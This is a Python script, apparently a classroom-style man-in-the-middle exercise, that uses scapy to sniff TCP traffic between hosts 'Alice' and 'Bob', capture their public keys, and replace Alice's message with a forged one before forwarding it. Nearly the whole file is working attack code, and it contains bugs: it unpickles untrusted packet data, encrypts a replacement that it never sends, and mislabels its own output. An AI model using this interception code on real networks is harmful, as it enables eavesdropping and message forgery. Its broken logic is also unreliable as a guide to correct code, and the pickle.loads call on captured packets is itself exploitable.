from scapy.all import *
from scapy.layers.inet import TCP, IP
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import pickle
# Define callback function to intercept packets

ALICE_IP_ADDR = "192.168.246.37"
BOB_IP_ADDR = "192.168.246.7"
ALICE_PKEY = ""
BOB_PKEY = ""

def intercept_packet(packet):
    global ALICE_PKEY
    global BOB_PKEY
    if IP in packet and TCP in packet and type(packet[TCP].payload) == Raw:
        # Check if the packet is from Alice to Bob
        if packet[IP].src == BOB_IP_ADDR and packet[IP].dst == ALICE_IP_ADDR:
            if not BOB_PKEY:
                print("Got bob's public key...")
                BOB_PKEY = packet[TCP].payload.load
                print(f"B = {BOB_PKEY}")
        if packet[IP].src == ALICE_IP_ADDR and packet[IP].dst == BOB_IP_ADDR:
            if not ALICE_PKEY:
                ALICE_PKEY = packet[TCP].payload.load
                print(f"A = {ALICE_PKEY}")
            else:
                print("Got Alice's packet...")
                # Decrypt the message and extract the plaintext
                print(f"P= {packet[TCP].payload.load}")
                encrypted_message, signature = pickle.loads(packet[TCP].payload.load)
                cipher = PKCS1_OAEP.new(RSA.import_key(BOB_PKEY))
                # Modify the message
                modified_message = b"Hello Bob! This message has been modified by Eve."

                modified_encrypted_message = cipher.encrypt(modified_message)
                print("Original message:", modified_encrypted_message)

                # Pack and send the modified message and signature
                modified_data = pickle.dumps(
                    (modified_message, signature, ALICE_PKEY))
                packet[TCP].payload.load = modified_data
                del packet[IP].chksum
                del packet[TCP].chksum
                print("Modified message:", modified_message)

                # Forward the modified packet to Bob
                send(packet, verbose=0)
    return


# Start sniffing packets
# sniff(filter = 'dst port 9090', prn=intercept_packet, iface="lo0")
# define a function to handle sniffed packets
def packet_handler(packet):
    # do something with the packet
    print(packet.summary())

# sniff(filter="tcp", prn=packet_handler, iface="lo0")


def sniff_message():
    # Define a filter to capture the message you're interested in
    filter = "tcp"

    # Start sniffing packets
    packets = sniff(filter=filter, prn=intercept_packet, store=0)

    # Assemble the packets into a single message
    message = b""
    for pkt in packets:
        if TCP in pkt:
            message += bytes(pkt[TCP].payload)

    # Print the assembled message
    print(message.decode())


if __name__ == '__main__':
    sniff_message()
